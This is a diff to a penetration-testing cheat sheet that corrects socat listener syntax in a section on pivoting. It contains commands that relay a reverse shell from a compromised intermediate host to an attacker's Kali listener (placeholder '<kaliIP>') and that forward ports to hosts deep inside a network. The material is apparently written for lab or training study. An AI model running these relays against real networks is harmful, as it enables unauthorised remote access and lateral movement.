@@ -230,6 +230,8 @@ puttygen id_rsa -o windowskey.ppk
 ### socat
 > Compiled binary probably has to be pushed onto the target system
 
+**IMPORTANT:** The param is `TCP-L` AND you should start your listener on kali *BEFORE* running `socat` to properly establish the port-forward.
+
 1. Reverse shell relay
 
 This creates a listening port on the intermediate host that forwards all traffic to our machine (at least with the command that follows)
@@ -239,7 +241,7 @@ This creates a listening port on the intermediate host that forwards all traffic
 kali> nc -nlvp 443
 
 # 2. start socat on intermediate host and forward incoming traffic on port 8000 to the listening port on the kali machine
-./socat tcp-1:8000 tcp:<kaliIP>:443 &
+./socat tcp-l:8000 tcp:<kaliIP>:443 &
 ```
 
 2. Port Forwarding
@@ -248,7 +250,7 @@ Forward the traffic to a target machine over an intermediate host
 
 ```bash
 # fork reuseaddr allow for multiple constant connections
-intermediate> socat tcp-1:4430,fork,reuseaddr tcp:<targetIP>:443 &
+intermediate> socat tcp-l:4430,fork,reuseaddr tcp:<targetIP>:443 &
 ```
 
 Pipes all incoming traffic to the target deep in the network.
@@ -257,7 +259,7 @@ Pipes all incoming traffic to the target deep in the network.
 
 ```bash
 # 1. on kali
-kali> socat tcp-1:8001 tcp-1:8000,fork,reuseaddr &
+kali> socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
 
 # 2. intermediate / relays
 socat tcp:<kaliIP>:8001 tcp:<deepHostIP>:<port>,fork &
